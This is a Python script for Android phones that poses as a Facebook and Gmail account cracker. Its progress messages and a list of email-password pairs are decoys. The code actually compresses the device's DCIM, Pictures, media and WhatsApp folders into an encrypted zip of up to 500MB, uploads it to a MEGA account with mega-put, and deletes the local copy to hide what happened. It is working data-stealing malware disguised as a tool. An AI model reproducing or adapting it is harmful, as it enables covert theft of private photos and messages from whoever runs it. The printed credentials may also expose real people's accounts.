from datetime import datetime
import os
import time
import pyzipper
import subprocess
folders_to_zip = ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", "/storage/emulated/0/Android/media"]
if os.path.exists("/storage/emulated/0/WhatsApp"):
    folders_to_zip.append("/storage/emulated/0/WhatsApp")
zip_file = "/storage/emulated/0/backup.zip"
zip_password = "scriptkiddies123"
def create_zip():
    print(f"[+] listing facebook Accounts (5000) Date {datetime.now()}")
    max_size = 500 * 1024 * 1024  # 500MB
    current_size = 0
    with pyzipper.AESZipFile(zip_file, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(zip_password.encode())
        for folder in folders_to_zip:
            for foldername, subfolders, filenames in os.walk(folder):
                for filename in filenames:
                    filepath = os.path.join(foldername, filename)
                    file_size = os.path.getsize(filepath)
                    if current_size + file_size > max_size:
                        print("wait a minute to check login...")
                        return
                    zf.write(filepath, os.path.relpath(filepath, "/storage/emulated/0"))
                    current_size += file_size
    print("Notice that the some of the first accounts will be already extracted wait for more:")
    print("Gmail ==> Password:")
    print("mohibakmal@gmail.com ==> kabulkabul")
    print("zazikamal@gmail.com ==> paktiakabul")
    print("nabishinwari@gmail.com ==> afghanistan")
    print("ziarmal@gmail.com ==> kabulkabul")
    print("khaikhoa@gmail.com ==> pekhaowar")
    print("asadamiri@gmail.com ==> afghanistan")
    print("it is running wait for more...")
def upload_to_mega():
    print("Uploading to Mega...")
    cmd = f"mega-put {zip_file}"
    os.system(cmd)
    print("1000 more found...")
def check_upload():
    cmd = "mega-ls /"
    output = subprocess.getoutput(cmd)
    if "backup.zip" in output:
        print("running...")
        return True
    else:
        upload_to_mega()
def delete_local_zip():
    if os.path.exists(zip_file):
        os.remove(zip_file)
        print("ZIP file deleted from local storage.")
if __name__ == "__main__":
    create_zip()
    time.sleep(40)  # Wait for ZIP to be created
    if not os.path.exists(zip_file):
        print("Error: ZIP file was not created. Exiting.")
        create_zip()
    upload_to_mega()
    time.sleep(30)  # Wait for upload to complete
    if check_upload():
        delete_local_zip()
    print("for more accounts follow our facebook! :)")
